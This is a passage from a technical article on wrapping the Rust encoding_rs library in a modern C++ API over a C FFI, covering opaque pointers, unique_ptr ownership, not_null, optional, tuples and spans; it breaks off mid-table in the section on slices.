<p>By ‚Äúmodern‚Äù C++ I mean that the interface that C++ callers see conforms to the <a href="https://isocpp.github.io/CppCoreGuidelines/CppCoreGuidelines">C++ Core Guidelines</a> and uses certain new features:

</p><ul>
<li>Heap allocations are managed by returning pointers to heap-allocated objects within <code>std::unique_ptr</code> / <code>mozilla::UniquePtr</code>.
</li><li>Caller-allocated buffers are represented using <code>gsl::span</code> / <code>mozilla::Span</code> instead of plain pointer and length.
</li><li>Multiple return values are represented using <code>std::tuple</code> / <code>mozilla::Tuple</code> instead of out params.
</li><li>Non-null plain pointers are annotated using <code>gsl::not_null</code> / <code>mozilla::NotNull</code>.
</li></ul>

<p><code>gsl::</code> above refers to the <a href="https://github.com/microsoft/GSL">Guidelines Support Library</a>, which provides things that the Core Guidelines expect to have available but that are not (yet) in the C++ standard library.

</p><h3>C++ Library in Rust?</h3>

<p>By writing a C++ library ‚Äúin Rust‚Äù I mean that the bulk of the library is actually a library written in Rust, but the interface provided to C++ callers makes it look and feel like a real C++ library as far as the C++ callers can tell.

</p><h3>Both C++ and Rust Have C Interop</h3>

<p>C++ has a very complex ABI, and the Rust ABI is not frozen. However, both C++ and Rust support functions that use the C ABI. Therefore, interoperability between C++ and Rust involves writing things in such a way that C++ sees Rust code as C code and Rust sees C++ code as C code.

</p><h3>Simplifying Factors</h3>

<p>This write-up should not be considered a comprehensive guide to exposing Rust code to C++. The interface to encoding_rs is simple enough that it lacks some complexities that one could expect from the general case of interoperability between the two languages. However, the factors that simplify the C++ exposure of encoding_rs can be taken as a guide to simplifications that one should seek to achieve in the interest of easy cross-language interoperability when designing libraries. Specifically:

</p><ul>
<li>encoding_rs never calls out to C++: The cross-language calls are unidirectional.
</li><li>encoding_rs does not hold references to C++ objects after a call returns: There is no need for Rust code to manage C++ memory.
</li><li>encoding_rs does not present an inheritance hierarchy either in Rust or in C++: There are no vtables on either side.
</li><li>The datatypes that encoding_rs operates on are very simple: Contiguous buffers of primitives (buffers of <code>u8</code>/<code>uint8_t</code> and <code>u16</code>/<code>char16_t</code>).
</li><li>Only the <code>panic=abort</code> configuration (i.e. a Rust panic terminates the program instead of unwinding the stack) is supported and <i>the code presented here is only correct if that option is used</i>. The code presented here does not try to prevent Rust panics from unwinding across the FFI, and letting a panic unwind across the FFI is Undefined Behavior.
</li></ul>

<h3>A Very Quick Look at the API</h3>

<p>To get an idea about <a href="https://docs.rs/encoding_rs">the Rust API under discussion</a>, let‚Äôs take a high-level look. The library has three public structs: <code>Encoding</code>, <code>Decoder</code> and <code>Encoder</code>. From the point of view of the library user, these structs are used like traits, superclasses or interfaces in the sense that they provide a uniform interface to various concrete encodings, but technically they are indeed structs. Instances of <code>Encoding</code> are statically allocated. <code>Decoder</code> and <code>Encoder</code> encapsulate the state of a streaming conversion and are allocated at run-time.

</p><p>A reference to an <code>Encoding</code>, that is <code>&amp;'static Encoding</code>, can be obtained either from label (textual identification extracted from protocol text) or by a named static. The <code>Encoding</code> can then be used as a factor for a <code>Decoder</code>, which is stack-allocated.  

</p><pre><code class="rust hljs"><span class="hljs-keyword">let</span> encoding: &amp;<span class="hljs-symbol">'static</span> Encoding =
    Encoding::for_label( <span class="hljs-comment">// by label</span>
        byte_slice_from_protocol
    ).unwrap_or(
        WINDOWS_1252     <span class="hljs-comment">// by named static</span>
    );

<span class="hljs-keyword">let</span> decoder: Decoder =
    encoding.new_decoder();</code></pre>

<p>In the streaming case, a method for decoding from a caller-allocated slice into another caller-allocate slice is available on the <code>Decoder</code>. The decoder performs no heap allocations.

</p><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">DecoderResult</span></span> {
    InputEmpty,
    OutputFull,
    Malformed(<span class="hljs-built_in">u8</span>, <span class="hljs-built_in">u8</span>),
}

<span class="hljs-keyword">impl</span> Decoder {
    <span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">decode_to_utf16_without_replacement</span></span>(
        &amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>,
        src: &amp;[<span class="hljs-built_in">u8</span>],
        dst: &amp;<span class="hljs-keyword">mut</span> [<span class="hljs-built_in">u16</span>],
        last: <span class="hljs-built_in">bool</span>
    ) -&gt; (DecoderResult, <span class="hljs-built_in">usize</span>, <span class="hljs-built_in">usize</span>)
}</code></pre>

<p>In the non-streaming case, the caller does not need to deal with <code>Decoder</code> and <code>Encoder</code> at all. Instead, methods for handling an entire logical input stream in one buffer are provided on <code>Encoding</code>.

</p><pre><code class="hljs rust"><span class="hljs-keyword">impl</span> Encoding {
    <span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">decode_without_bom_handling_and_without_replacement</span></span>&lt;<span class="hljs-symbol">'a</span>&gt;(
        &amp;<span class="hljs-symbol">'static</span> <span class="hljs-keyword">self</span>,
        bytes: &amp;<span class="hljs-symbol">'a</span> [<span class="hljs-built_in">u8</span>],
    ) -&gt; <span class="hljs-built_in">Option</span>&lt;Cow&lt;<span class="hljs-symbol">'a</span>, <span class="hljs-built_in">str</span>&gt;&gt;
}</code></pre>

<h3>The Process</h3>

<h4>0. Designing for FFI-friendliness</h4>

<p>Some of the simplifying factors arise from the problem domain itself. Others are a matter of choice.

</p><p>A character encoding library could reasonably present traits (similar to abstract superclasses with no fields in C++) for each of the concepts of an encoding, a decoder and an encoder. Instead, encoding_rs has structs for these that internally <code>match</code> on an <code>enum</code> for dispatch instead of relying on a <a href="https://en.wikipedia.org/wiki/Virtual_method_table">vtable</a>. 

</p><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Decoder</span></span> { <span class="hljs-comment">// no vtable</span>
   variant: VariantDecoder,
   <span class="hljs-comment">// ...</span>
}

<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">VariantDecoder</span></span> { <span class="hljs-comment">// no extensibility</span>
    SingleByte(SingleByteDecoder),
    Utf8(Utf8Decoder),
    Gb18030(Gb18030Decoder),
    <span class="hljs-comment">// ...</span>
}</code></pre>

<p>The primary motivation for this wasn‚Äôt as much eliminating vtables per se but to make the hierarchy intentionally unextensible. This reflects a philosophy that adding character encodings is not something that programmers should do. Instead, programs should use UTF-8 for interchange, and programs should support legacy encodings only to the extent necessary for compatibility with existing content. The non-extensibility of the hierarchy provides stronger type-safety. If you have an <code>Encoding</code> from encoding_rs, you can trust that it doesn‚Äôt exhibit characteristics that aren‚Äôt exhibited by the encodings defined in the Encoding Standard. That is, you can trust that it won‚Äôt behave like UTF-7 or EBCDIC.

</p><p>Additionally, by dispatching on an <code>enum</code>, a decoder for one encoding can internally morph into a decoder for another encoding in response to <a href="https://en.wikipedia.org/wiki/Byte_order_mark">BOM</a> sniffing.

</p><p>One might argue that the Rustic way to provide encoding converters would be making them into iterator adaptors that consume an iterator of bytes and yield Unicode scalar values or vice versa. In addition to iterators being more complex to expose across the FFI, iterators make it harder to perform tricks to accelerate ASCII processing. Taking a slice to read from and a slice to write to not only makes it easier to represent things in a C API (in C terms, a Rust slice decomposes to an aligned non-null pointer and a length) but also enables ASCII acceleration by processing more than one code unit at a time making use of the observation that multiple code units fit in a single register (either an ALU register or a SIMD register).

</p><p>If the Rust-native API deals only with primitives, slices and (non-trait object) structs, it is easier to map to a C API than a Rust API that deals with fancier Rust features. (In Rust, you have a <a href="https://doc.rust-lang.org/book/second-edition/ch17-02-trait-objects.html#trait-objects-perform-dynamic-dispatch">trait object</a> when type erasure happens. That is, you have a trait-typed reference that does not say the concrete struct type of the referent that implements the trait.)

</p><h4>1. Creating the C API</h4>

<p>When the types involved are simple enough, the main mismatches between C and Rust are the lack of methods and multiple return values in C and the inability to transfer non-C-like structs by value.

</p><ul>
<li>Methods are wrapped by functions whose first argument is a pointer to the struct whose method is being wrapped.
</li><li>Slice arguments become two arguments: the pointer to the start of the slice and the length of the slice.
</li><li>One primitive value is returned as a function return value and the rest become out params. When the output params clearly relate to  inputs of the same type, it makes sense to use in/out params.
</li><li>When a Rust method returns the struct by value, the wrapper function boxes it and returns a pointer such that the Rust side forgets about the struct. Additionally, a function for freeing a given struct type by pointer is added. Such a method simply turns pointer back into a box and drops the box. The struct is opaque from the C point of view.
</li><li>As a special case, the method for getting the name of an encoding, which in Rust would return <code>&amp;'static str</code> is wrapped by a function that takes a pointer to writable buffer whose length must be at least the length of the longest name.
</li><li><code>enum</code>s signaling the exhaustion of the input buffer, the output buffer becoming full or errors with detail about the error became <code>uint32_t</code> with constants for ‚Äúinput empty‚Äù and ‚Äúoutput full‚Äù and rules for how to interpret the other error details. This isn‚Äôt ideal but works pretty well in this case.
</li><li>Overflow-checking length computations are presented as saturating instead. That is, the caller has to treat <code>SIZE_MAX</code> as a value signaling overflow.
</li></ul>

<h4>2. Re-Creating the Rust API in C++ over the C API</h4>

<p>Even <a href="https://github.com/hsivonen/encoding_c/blob/master/include/encoding_rs.h">an idiomatic C API</a> doesn‚Äôt make for a modern C++ API. Fortunately, Rustic concepts like multiple return values and slices can be represented in C++, and by reinterpreting pointers returned by the C API as pointers to C++ objects, it‚Äôs possible to present the ergonomics of C++ methods.

</p><p>Most of the examples are from <a href="https://github.com/hsivonen/encoding_c/blob/master/include/encoding_rs_cpp.h">a version of the API that uses C++17 standard library types</a>. In Gecko, we generally avoid the C++ standard library and use <a href="https://searchfox.org/mozilla-central/source/intl/Encoding.h">a version of the C++ API to encoding_rs that uses Gecko-specific types</a>. I assume that the standard-library-type examples make more sense to a broader audience.

</p><h5>Method Ergonomics</h5>

<p>For each opaque struct pointer type in C, a class is defined in C++ and the C header is tweaked such that the pointer types become pointers to instances of the C++ classes from the point of view of the C++ compiler. This amounts to a <code>reinterpret_cast</code> of the pointers without actually writing out the <code>reinterpret_cast</code>.

</p><p>Since the pointers don‚Äôt truly point to instances of the classes that they appear to point to but point to instances of Rust structs instead, it‚Äôs a good idea to take some precautions. No fields are declared for the classes. The default no-argument and copy constructors are <code>delete</code>d as is the default <code>operator=</code>. Additionally, there must be no virtual methods. (This last point is an important limitation that will come back to later.)

</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Encoding</span> <span class="hljs-title">final</span> {</span>
<span class="hljs-comment">// ...</span>
<span class="hljs-keyword">private</span>:
    Encoding() = <span class="hljs-keyword">delete</span>;
    Encoding(<span class="hljs-keyword">const</span> Encoding&amp;) = <span class="hljs-keyword">delete</span>;
    Encoding&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-keyword">const</span> Encoding&amp;) = <span class="hljs-keyword">delete</span>;
    ~Encoding() = <span class="hljs-keyword">delete</span>;
};
</code></pre>

<p>In the case of <code>Encoding</code> whose all instances are static, the destructor is <code>delete</code>d as well. In the case of the dynamically-allocated <code>Decoder</code> and <code>Encoder</code> both an empty destructor and a <code>static void operator delete</code> is added. (An example follows a bit later.) This enables the destruction of the fake C++ class to be routed to the right type-specific freeing function in the C API.

</p><p>With that foundation in place to materialize pointers that look like pointers to C++ class instances, it‚Äôs possible to make method calls on this pointers work. (An example follows after introducing the next concept, too.)

</p><h5>Returning Dynamically-Allocated Objects</h5>

<p>As noted earlier, the cases where the Rust API would return an <code>Encoder</code> or a <code>Decoder</code> by value so that the caller can place them on the stack is replaced by the FFI wrapper boxing the objects so that the C API exposes only heap-allocated objects by pointer. Also, the reinterpretation of these pointers as <code>delete</code>able C++ object pointers was already covered. 

</p><p>That still leaves making sure that <code>delete</code> is actually used at an appropriate time. In modern C++, when an object can have only one legitimate owner of the time, this is accomplished by wrapping the object pointer in <code>std::unique_ptr</code> or <code>mozilla::UniquePtr</code>. The old <code>uconv</code> converters supported reference counting, but all the actual uses in the Gecko code base involved only one owner for each converter. Since the usage patterns of encoders and decoders are such that there is only one legitimate owner of the time, using <code>std::unique_ptr</code> and <code>mozilla::UniquePtr</code> is what the two C++ wrappers for encoding_rs do.

</p><p>Let‚Äôs take a look at a factory method on <code>Encoding</code> that returns a <code>Decoder</code>. In Rust, we have a method that takes a reference to <code>self</code> and returns <code>Decoder</code> by value.

</p><pre><code class="rust hljs"><span class="hljs-keyword">impl</span> Encoding {
    <span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">new_decoder</span></span>(&amp;<span class="hljs-symbol">'static</span> <span class="hljs-keyword">self</span>) -&gt; Decoder {
        <span class="hljs-comment">// ...</span>
    }
}</code></pre>

<p>On the FFI layer, we have an explicit pointer-typed first argument that corresponds to Rust <code>&amp;self</code> and C++ <code>this</code> (specifically, the <code>const</code> version of <code>this</code>). We allocate memory on the heap (<code>Box::new()</code>) and place the <code>Decoder</code> into the allocated memory. We then forget about the allocation (<code>Box::into_raw</code>) so that we can return the pointer to C without deallocating at the end of the scope. In order to be able to free the memory, we introduce a new function that puts the <code>Box</code> back together and assigns it into a variable that immediately goes out of scope causing the heap allocation to be freed.

</p><pre><code class="rust hljs"><span class="hljs-meta">#[no_mangle]</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">encoding_new_decoder</span></span>(
    encoding: *<span class="hljs-keyword">const</span> Encoding) -&gt; *<span class="hljs-keyword">mut</span> Decoder
{
    <span class="hljs-built_in">Box</span>::into_raw(<span class="hljs-built_in">Box</span>::new((*encoding).new_decoder()))
}

<span class="hljs-meta">#[no_mangle]</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">"C"</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">decoder_free</span></span>(decoder: *<span class="hljs-keyword">mut</span> Decoder) {
    <span class="hljs-keyword">let</span> _ = <span class="hljs-built_in">Box</span>::from_raw(decoder);
}</code></pre>

<p>In the C header, they look like this:

</p><pre><code class="c hljs cpp"><span class="hljs-function">ENCODING_RS_DECODER*
<span class="hljs-title">encoding_new_decoder</span><span class="hljs-params">(ENCODING_RS_ENCODING <span class="hljs-keyword">const</span>* encoding)</span></span>;

<span class="hljs-function"><span class="hljs-keyword">void</span>
<span class="hljs-title">decoder_free</span><span class="hljs-params">(ENCODING_RS_DECODER* decoder)</span></span>;</code></pre>

<p><code>ENCODING_RS_DECODER</code> is a macro that is used for substituting the right C++ type when the C header is used in the C++ context instead of being used as a plain C API.

</p><p>On the C++ side, then, we use <code>std::unique_ptr</code>, which is the C++ analog of Rust‚Äôs <code>Box</code>. They are indeed very similar:

</p><dl>
    <dt><code class="rust hljs"><span class="hljs-keyword">let</span> ptr: <span class="hljs-built_in">Box</span>&lt;Foo&gt;</code></dt>
    <dd><code class="cpp hljs"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Foo&gt; ptr</code></dd>
    <dt><code class="rust hljs"><span class="hljs-built_in">Box</span>::new(Foo::new(a, b, c))</code></dt>
    <dd><code class="cpp hljs">make_unique&lt;Foo&gt;(a, b, c)</code></dd>
    <dt><code class="rust hljs"><span class="hljs-built_in">Box</span>::into_raw(ptr)</code></dt>
    <dd><code class="cpp hljs">ptr.release()</code></dd>
    <dt><code class="rust hljs"><span class="hljs-keyword">let</span> ptr = <span class="hljs-built_in">Box</span>::from_raw(raw_ptr);</code></dt>
    <dd><code class="cpp hljs"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Foo&gt; ptr(raw_ptr);</code></dd>
</dl>

<p>We wrap the pointer obtained from the C API in a <code>std::unique_ptr</code>:

</p><pre><code class="cpp hljs"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Encoding</span> <span class="hljs-title">final</span> {</span>
<span class="hljs-keyword">public</span>:
    <span class="hljs-keyword">inline</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Decoder&gt; new_decoder() <span class="hljs-keyword">const</span>
    {
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Decoder&gt;(
            encoding_new_decoder(<span class="hljs-keyword">this</span>));
    }
};</code></pre>

<p>When the <code>std::unique_ptr&lt;Decoder&gt;</code> goes out of scope, the deletion is routed back to Rust via FFI thanks to declarations like this:

</p><pre><code class="cpp hljs"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Decoder</span> <span class="hljs-title">final</span> {</span>
<span class="hljs-keyword">public</span>:
    ~Decoder() {}
    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-keyword">operator</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-keyword">void</span>* decoder)</span>
    </span>{
        decoder_free(<span class="hljs-keyword">reinterpret_cast</span>&lt;Decoder*&gt;(decoder));
    }
<span class="hljs-keyword">private</span>:
    Decoder() = <span class="hljs-keyword">delete</span>;
    Decoder(<span class="hljs-keyword">const</span> Decoder&amp;) = <span class="hljs-keyword">delete</span>;
    Decoder&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-keyword">const</span> Decoder&amp;) = <span class="hljs-keyword">delete</span>;
};</code></pre>

<h5>How Can it Work?</h5>

<p>In Rust, non-trait methods are just syntactic sugar:

</p><pre><code class="rust hljs"><span class="hljs-keyword">impl</span> Foo {
    <span class="hljs-keyword">pub</span> <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">get_val</span></span>(&amp;<span class="hljs-keyword">self</span>) -&gt; <span class="hljs-built_in">usize</span> {
        <span class="hljs-keyword">self</span>.val
    }
}

<span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">test</span></span>(bar: Foo) {
    <span class="hljs-built_in">assert_eq!</span>(bar.get_val(), Foo::get_val(&amp;bar));
}</code></pre>

<p>A method call on non-trait-typed reference is just a plain function call with the reference to <code>self</code> as the first argument. On the C++ side, non-virtual method calls work the same way: A non-virtual C++ method call is really just a function call whose first argument is the <code>this</code> pointer.

</p><p>On the FFI/C layer, we can pass the same pointer as an explicit pointer-typed first argument.

</p><p>When calling <code>ptr-&gt;Foo()</code> where <code>ptr</code> is of type <code>T*</code>, the type of <code>this</code> is <code>T*</code> if the method is declared as <code>void Foo()</code> (which maps to <code>&amp;mut self</code> in Rust) and <code>const T*</code> if the method is declared as <code>void Foo() const</code> (which maps to <code>&amp;self</code> in Rust), so <code>const</code>-correctness is handled, too. 

</p><dl>
    <dt><code class="rust hljs"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">foo</span></span>(&amp;<span class="hljs-keyword">self</span>, bar: <span class="hljs-built_in">usize</span>) -&gt; <span class="hljs-built_in">usize</span></code></dt>
    <dd><code class="cpp hljs"><span class="hljs-keyword">size_t</span> foo(<span class="hljs-keyword">size_t</span> bar) <span class="hljs-keyword">const</span></code>
    </dd><dt><code class="rust hljs"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">foo</span></span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>, bar: <span class="hljs-built_in">usize</span>) -&gt; <span class="hljs-built_in">usize</span></code></dt>
    <dd><code class="cpp hljs"><span class="hljs-keyword">size_t</span> foo(<span class="hljs-keyword">size_t</span> bar)</code>
</dd></dl>

<p>The qualifications about ‚Äúnon-trait-typed‚Äù and ‚Äúnon-virtual‚Äù are important. For the above to work, <i>we can‚Äôt have vtables on either side</i>. This means no Rust trait objects and no C++ inheritance. In Rust, trait objects, i.e. trait-typed references to any struct that implements the trait, are implemented as two pointers: one to the struct instance and another to the vtable appropriate for the concrete type of the data. We need to be able to pass reference to <code>self</code> across the FFI as a single pointer, so there‚Äôs no place for the vtable pointer when crossing the FFI. In order to keep pointers to C++ objects as C-compatible plain pointers, C++ puts the vtable pointer on the objects themselves. Since the pointers don‚Äôt really point to C++ objects carrying vtable pointers but point to Rust objects, we must make sure not to make the C++ implementation expect to find a vtable pointer on the pointee.

</p><p>As a consequence, the C++ reflector classes for the Rust structs cannot inherit from a common baseclass of a C++ framework. In the Gecko case, the reflector classes cannot inherit from <code>nsISupports</code>. E.g. in the context of Qt, the reflector classes wouldn‚Äôt be able to inherit from <code>QObject</code>.

</p><h5>Non-Nullable Pointers</h5>

<p>There are methods in the Rust API that return <code>&amp;'static Encoding</code>. Rust references can never be null, and it would be nice to relay this piece of information in the C++ API. It turns out that there is a C++ idiom for this: <code>gsl::not_null</code> and <code>mozilla::NotNull</code>.

</p><p>Since <code>gsl::not_null</code> and <code>mozilla::NotNull</code> are just type system-level annotations that don‚Äôt change the machine representation of the underlying pointer and since from the guarantees Rust we know which pointers that we get from the FFI really never are null, it is tempting to apply the same reinterpretation trick of lying to the C++ compiler about types that we use to reinterpret pointers returned by the FFI as pointers to fieldless C++ objects with no virtual methods and to claim in a header file that the pointers that we know not to be null in the FFI return values are of the type <code>mozilla::NotNull&lt;const Encoding*&gt;</code>. Unfortunately, this doesn‚Äôt actually work because types involving templates are not allowed in the declarations of <code>extern "C"</code> functions in C++, so the C++ code ends up executing a branch for the null check when wrapping pointers received from the C API with <code>gsl::not_null</code> or <code>mozilla::NotNull</code>.

</p><p>However, there are also declarations of static pointers to the constant encoding objects (where the pointees are defined in Rust) and it happens that C++ <i>does</i> allow declaring those as <code>gsl::not_null&lt;const Encoding*&gt;</code>, so that is what is done. (Thanks to Masatoshi Kimura for pointing out that this is possible.)

</p><p>The statically-allocated instances of <code>Encoding</code> are declared in Rust like this:

</p><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">static</span> UTF_8_INIT: Encoding = Encoding {
    name: <span class="hljs-string">"UTF-8"</span>,
    variant: VariantEncoding::Utf8,
};

<span class="hljs-keyword">pub</span> <span class="hljs-keyword">static</span> UTF_8: &amp;<span class="hljs-symbol">'static</span> Encoding = &amp;UTF_8_INIT;</code></pre>

<p>In Rust, the <a href="https://twitter.com/tshepang_dev/status/1051558270425591808">general rule</a> is that you use <code>static</code> for an unchanging memory location and <code>const</code> for an unchanging value. Therefore, <code>UTF_8_INIT</code> should be <code>static</code> and <code>UTF_8</code> should be <code>const</code>: the value of the reference to the <code>static</code> instance is unchanging, but statically allocating a memory location for the reference is not logically necessary. Unfortunately, Rust has a rule that says that the right-hand side of <code>const</code> may not contain anything <code>static</code> and this is applied so heavily as to prohibit even references to <code>static</code>, in order to ensure that the right-hand side of a <code>const</code> declaration can be statically checked to be suitable for use within any imaginable <code>const</code> declaration‚Äîeven one that tried to dereference the reference at compile time.

</p><p>For FFI, though, we need to allocate an unchanging memory location to a pointer to <code>UTF_8_INIT</code>, because such memory locations work in C linkage and allow us provide a pointer-typed named thing to C. The representation of <code>UTF_8</code> above is already what we need, but for Rust ergonomics, we want <code>UTF_8</code> to participate in Rust‚Äôs crate namespacing. This means that from the C perspective the name gets mangled. We waste some space by statically allocating pointers <i>again</i> without name mangling for C usage:

</p><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ConstEncoding</span></span>(*<span class="hljs-keyword">const</span> Encoding);

<span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">impl</span> <span class="hljs-built_in">Sync</span> <span class="hljs-keyword">for</span> ConstEncoding {}

<span class="hljs-meta">#[no_mangle]</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">static</span> UTF_8_ENCODING: ConstEncoding =
    ConstEncoding(&amp;UTF_8_INIT);</code></pre>

<p>A pointer type is used to make in clear that C is supposed to see a pointer (even if a Rust reference type would have the same representation). However, the Rust compiler refuses to compile a program with globally-visible pointer. Since globals are reachable from different threads, multiple threads accessing the pointee might be problem. In this case, the pointee cannot be mutated, so global visibility is fine. To tell the compiler that this is fine, we need to implement the <code>Sync</code> marker trait for the pointer. However, traits cannot be implemented on pointer types. As a workaround, we create a newtype for <code>*const Encoding</code>. A newtype has the same representation as the type it wraps, but we can implement traits on the newtype. Implementing <code>Sync</code> is <code>unsafe</code>, because we are asserting to the compiler that something is OK when the compiler does not figure it out on its own.

</p><p>In C++, we can then say (what via macros expands to):

</p><pre><code class="hljs cpp"><span class="hljs-keyword">extern</span> "C" {
    <span class="hljs-keyword">extern</span> gsl::not_null&lt;<span class="hljs-keyword">const</span> encoding_rs::Encoding*&gt; <span class="hljs-keyword">const</span> UTF_8_ENCODING;
}</code></pre>

<p>The pointers to the encoders and decoders are also known not to be null, since allocation failure would terminate the program, but <code>std::unique_ptr</code> / <code>mozilla::UniquePtr</code> and <code>gsl::not_null</code> / <code>mozilla::NotNull</code> cannot be combined.

</p><h5>Optional Values</h5>

<p>In Rust, it‚Äôs idiomatic to use <code>Option&lt;T&gt;</code> to represent return values might either have a value or might not have a value. C++ these days provides the same thing as <code>std::optional&lt;T&gt;</code>. In Gecko, we instead have <code>mozilla::Maybe&lt;T&gt;</code>.

</p><p>Rust‚Äôs <code>Option&lt;T&gt;</code> and C++‚Äôs <code>std::optional&lt;T&gt;</code> indeed are basically the same thing:

</p><dl>
    <dt><code class="rust hljs"><span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>;</code></dt>
    <dd><code class="cpp hljs"><span class="hljs-keyword">return</span> <span class="hljs-built_in">std</span>::nullopt;</code></dd>
    <dt><code class="rust hljs"><span class="hljs-keyword">return</span> <span class="hljs-literal">Some</span>(foo);</code></dt>
    <dd><code class="cpp hljs"><span class="hljs-keyword">return</span> foo;</code></dd>
    <dt><code class="rust hljs">is_some()</code></dt>
    <dd><code class="cpp hljs"><span class="hljs-function"><span class="hljs-keyword">operator</span> <span class="hljs-title">bool</span><span class="hljs-params">()</span></span></code></dd>
    <dd><code class="cpp hljs">has_value()</code></dd>
    <dt><code class="rust hljs">unwrap()</code></dt>
    <dd><code class="cpp hljs">value()</code></dd>
    <dt><code class="rust hljs">unwrap_or(bar)</code></dt>
    <dd><code class="cpp hljs">value_or(bar)</code></dd>
</dl>

<p>Unfortunately, though, C++ reverses the safety ergonomics. The most ergonomic way to extract the wrapped value from a <code>std::optional&lt;T&gt;</code> is via <code>operator*()</code>, which is unchecked and, therefore, unsafe. <span class="emoji">üò≠</span>

</p><h5>Multiple Return Values</h5>

<p>While C++ lacks language-level support for multiple return values, multiple return values are possible thanks to library-level support. In the case of the standard library, the relevant library pieces are <code>std::tuple</code>, <code>std::make_tuple</code> and <code>std::tie</code>. In the case of Gecko, the relevant library pieces are <code>mozilla::Tuple</code>, <code>mozilla::MakeTuple</code> and <code>mozilla::Tie</code>. 

</p><dl>
    <dt><code class="rust hljs"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">foo</span></span>() -&gt; (T, U, V)</code></dt>
    <dd><code class="cpp hljs"><span class="hljs-built_in">std</span>::tuple&lt;T, U, V&gt; foo()</code></dd>
    <dt><code class="rust hljs"><span class="hljs-keyword">return</span> (a, b, c);</code></dt>
    <dd><code class="cpp hljs"><span class="hljs-keyword">return</span> {a, b, c};</code></dd>
    <dt><code class="rust hljs"><span class="hljs-keyword">let</span> (a, b, c) = foo();</code></dt>
    <dd><code class="cpp hljs"><span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> [a, b, c] = foo();</code></dd>
    <dt><code class="rust hljs"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> (a, b, c) = foo();</code></dt>
    <dd><code class="cpp hljs"><span class="hljs-keyword">auto</span> [a, b, c] = foo();</code></dd>
</dl>

<h5>Slices</h5>

<p>A Rust slice wraps a non-owning pointer and a length that identify a contiguous part of an array. In comparison to C:

</p><dl>
    <dt><code class="rust hljs">src: &amp;[<span class="hljs-built_in">u8</span>]</code></dt>
    <dd><code class="c hljs cpp"><span class="hljs-keyword">const</span> <span class="hljs-keyword">uint8_t</span>* src, <span class="hljs-keyword">size_t</span> src_len</code></dd>
    <dt><code class="rust hljs">dst: &amp;<span class="hljs-keyword">mut</span> [<span class="hljs-built_in">u8</span>]</code></dt>
    <dd><code class="c hljs cpp"><span class="hljs-keyword">uint8_t</span>* dst, <span class="hljs-keyword">size_t</span> dst_len</code></dd>
</dl>

<p>There isn‚Äôt a corresponding thing in the C++ standard library yet (except <code>std::string_view</code> for read-only string slices), but it‚Äôs already part of the C++ Core Guidelines and is called a <a href="https://github.com/isocpp/CppCoreGuidelines/blob/master/CppCoreGuidelines.md#i13-do-not-pass-an-array-as-a-single-pointer">span</a> there.

</p><dl>
    <dt><code class="rust hljs">src: &amp;[<span class="hljs-built_in">u8</span>]</code></dt>
    <dd><code class="cpp hljs">gsl::span&lt;<span class="hljs-keyword">const</span> <span class="hljs-keyword">uint8_t</span>&gt; src</code></dd>
    <dt><code class="rust hljs">dst: &amp;<span class="hljs-keyword">mut</span> [<span class="hljs-built_in">u8</span>]</code></dt>
    <dd><code class="cpp hljs">gsl::span&lt;<span class="hljs-keyword">uint8_t</span>&gt; dst</code></dd>
    <dt><code class="rust hljs">&amp;<span class="hljs-keyword">mut</span> vec[..]</code></dt>
    <dd><code class="cpp hljs">gsl::make_span(vec)</code></dd>
    <dt><code class="rust hljs">std::slice::from_raw_parts(ptr, len)</code></dt>
    <dd><code class="cpp hljs">gsl::make_span(ptr, len)</code></dd>
    <dt><code class="rust hljs"><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> slice {}</code></dt>
    <dd><code class="cpp hljs"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp;&amp; item : span) {}</code></dd>
    <dt><code class="rust hljs">slice[i]</code></dt>
